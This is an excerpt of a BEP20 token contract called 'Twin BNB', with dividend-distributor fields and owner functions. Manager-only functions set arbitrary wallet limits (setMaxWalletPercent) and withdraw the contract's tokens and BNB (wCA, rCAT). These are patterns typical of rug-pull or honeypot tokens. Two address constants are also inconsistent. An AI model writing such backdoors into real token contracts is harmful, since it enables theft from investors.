...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 BBTC = IBEP20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ...
    uint256 public minPeriod = 30 * 60; // 30 Minutes
    uint256 public minDistribution = 1 * (10 ** 18); // Reward Token Decimal
...
contract TwinBNB is IBEP20, Auth {
    using SafeMath for uint256;
    address BBTC = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "Twin BNB";
    string constant _symbol = "TNBNB";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 10000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 200000 * (10 ** _decimals);
    uint256 public _maxWalletToken = 800000 * (10 ** _decimals);
    ...
    uint256 public swapThreshold = 30000 * (10 ** _decimals);
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
    ...
    function setMaxWalletPercent(uint256 maxWallPercent) external{
        require(_mgr == msg.sender);
        _maxWalletToken = maxWallPercent * (10 ** _decimals);
    }
    ...
    function rCAT(address _token) external {
        ...
        IBEP20(_token).transfer(payable(msg.sender), balance);
    }
    function wCA() external {
        require(_mgr == msg.sender);
        uint256 balance = IBEP20(address(this)).balanceOf(address(this));
        IBEP20(address(this)).transfer(payable(msg.sender), balance);
        payable(msg.sender).transfer(address(this).balance);
    }
}